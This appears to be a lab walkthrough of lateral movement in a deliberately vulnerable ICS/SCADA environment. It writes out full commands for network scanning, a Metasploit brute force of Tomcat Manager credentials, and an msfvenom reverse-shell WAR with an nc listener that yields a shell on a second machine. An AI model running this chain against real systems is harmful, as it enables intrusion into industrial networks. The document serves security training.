# Lateral movement

The attacker exploits a vulnerability in a remote service, allowing the attack to spread to the ICS network (this could be SCADA bridging IT and OT environments). \[T0866]

T0866 -> <https://attack.mitre.org/techniques/T0866/> 

After getting inside the web application machine.

**Lateral Movement via Apache Manager Weak Credentials (CVE-2009-3548)**

Once inside the vulnerable web server machine, the attacker's goal is to move laterally to another machine within the same network. In this case, the attacker is targeting the Apache Tomcat Manager in **ScadaBR**, which was purposely set to be vulnerable due to weak credentials (CVE-2009-3548).


### **Step-by-Step:**

1. **Obtaining a Shell Access:**

- After gaining initial access using the vulnerability in the web server, the attacker establishes a shell session using **Meterpreter** (last phase).

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfDN4B2F3RJ5vrYTmrgI4sO86pl6MTybgV100h2dIL6p-MMQ_BLAEcTE1751LON5qQI6oSAezsgwMdGYV2PUwTAItqMltCzdaHJ7OIPvbuA0OT5WA6LWvxqebFExfrIizhWtOlLi--yj7ud4fWW4fR8cstk?key=ZVE4yllmhIbKOidz4k1V_g)

**Img 7:** Log4Shell exploit execution with successful remote execution.

2\. **Network Enumeration:**

- The attacker runs network commands to identify the IP configuration and other network devices.

- Result shows that the machine has two interfaces (`eth0` and `eth1`), with `eth1` assigned the IP `192.168.51.2/24 and a network that can be scanned`.

```
# checking interfaces
ip a # scanning the discovered network`
nmap 192.168.51.2/24

```
![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXd63FP86iRmWYrAPos379ndo4qOAnoJ-chUJyjM66BotSj0tOPdrol1WJidHA6_leya58HSuX8PcmqVqvtBnslAdM9W4pwEBJ_xXw7h9WK_T3EpNfoLcW7P-ojVX1d7oXmKcqWqUxVM1U79Tgq-mFV98L-B?key=ZVE4yllmhIbKOidz4k1V_g)

**Img 8:** Network results (discovery of 192.168.51.5 machine).

3.  **Exploiting Tomcat Manager (CVE-2009-3548):**

****![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXd8SyfUeVMDbSflFyh2-XqQ11oejRJAtcClA3Lq1PorrhafwMhP77hKxtS3PpQzd2R4iTTaxxEIaQ6ZjOws-8hzM0_bdVOFVmJNmniIgj87-YdD6YhwP5bcAPbbde6J84DMd3ZCIRqiySqcdXUve6QaUIJ1?key=ZVE4yllmhIbKOidz4k1V_g)****

**Img 9:** Tomcat server at 192.168.51.5:9090.

- The attacker targets the **Tomcat Manager** running on `192.168.51.5:9090/manager/html`.

- Using **Metasploit's** `scanner/http/tomcat_mgr_login` **module**, the attacker brute-forces the default credentials (`admin:admin`).

```
# step 1
sudo msfconsole

# step 2
use scanner/http/tomcat\_mgr\_login  

# step 3
setg RHOSTS \<target-ip>  `# 10.208.89.15 or 192.168.51.5 if in M1
setg RPORT \<target-port> # 9090
setg TARGETURI \<target url> # /manager/html

#step 4
exploit

```
![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXe2qMuFXGGOEA5RLTLO3hvakHwZkDHRrW2wLG-RKIth0wwptoNdUCOYtcl5R6WzPphk4UHR8uXagBMEnPQReQx0GF_5MkTtFJBley6-CWoAXhHMvm1fEzhzuOIIrB4uFDV9mLOn8AmnwdRHAboCsRSo-bje?key=ZVE4yllmhIbKOidz4k1V_g)

**Img 10:** Tomcat server brute force attack at 192.168.51.5:9090/manager.html and discovery of credentials (admin:admin).

4\. **Crafting Malicious WAR File for Remote Code Execution (RCE):**

Once access is gained to the **Tomcat Manager**, the attacker uploads a malicious WAR file.

- The attacker uses **msfvenom** to create a malicious **WAR** file:

- The payload is configured to connect back to the attacker's listener on port 443 and on the M1 machine.
```
# step 1

sudo msfvenom -p java/shell\_reverse\_tcp LHOST=192.168.51.2 LPORT=443 -f war -o /tmp/shell.war

# step 2 

# upload the genereted shell.war file to the tomcat manager
```

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeMselmAuZKxQLJQLmFgDrG5wqdsNGCTbtwr8PP92Z2dyZX73aEJ2vO_OZKHF_SPdOXNqjboCk8v0JH7si-tl9YgQ86h_Zcm_rNrc_N48-4lBq7X0dkWzrBiW9dBZR-GjKsjzCbGTJPRqFgJnbQuV0xBJ0y?key=ZVE4yllmhIbKOidz4k1V_g)

**Img 11:** Malicious WAR file (shell.war) uploaded in Tomcat server by the manager URL.

5\. **Triggering the Exploit and Establishing Reverse Shell**

- The attacker sets up a listener on the attacker's machine at `192.168.51.2`.

- The attacker triggers the RCE by accessing http\://10.208.89.15:9090/shell  or http\://192.168.51.5:9090/shell

```
# step 1

nc -lvnp 443

# step 2

# access_ http\://10.208.89.15:9090/shell |

```

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXf6eQQLicqhkkjPsZ1Je1NiC8hpKTLpNCdc1GRLxNMMXYNad_68B4WBEoKos_53Zbgrb_I60DrLctTzfd6L1ERB7IQeD4McI0JpC4e_m6QO79ycWOO4pyYjyLwMdeH12I92Rp6rhiDIw_ClVMS9vwgCjlA?key=ZVE4yllmhIbKOidz4k1V_g)

**Img 12:** RCE execution and successful invasion of M2.

